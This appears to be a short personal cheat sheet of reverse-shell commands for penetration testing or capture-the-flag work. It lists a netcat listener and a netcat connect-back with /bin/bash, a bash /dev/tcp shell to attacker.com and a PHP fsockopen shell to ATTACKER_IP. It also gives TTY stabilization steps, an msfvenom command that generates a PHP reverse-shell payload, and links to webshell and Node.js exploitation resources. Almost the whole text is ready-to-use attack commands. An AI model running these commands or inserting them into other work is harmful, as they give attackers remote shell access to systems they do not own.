```
# attacker:  
sudo nc -lvnp 443  
# target:  
nc local-ip port -e /bin/bash
```
## bash reverse shell
```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```
### php reverse shell
```bash
php reverse shell:  
php -r ' $s=fsockopen("ATTACKER_IP",1234); proc_open("/bin/sh -i", [ 0=>$s, 1=>$s, 2=>$s ], $p); '
```
### stabilization of reverse shell
```bash
/bin/bash  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
CTRL+Z  
stty raw -echo;fg  
stty rows 29 columns 126  
export TERM=XTERM-256color
```
## generating reverse shell with msfvenom
```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```


## Other tools

[https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

in kali linux command: ``webshells`` (/usr/share/webshells)

## nodejs

[https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet](https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet)  
[https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/](https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/)

## Useful resources:

https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells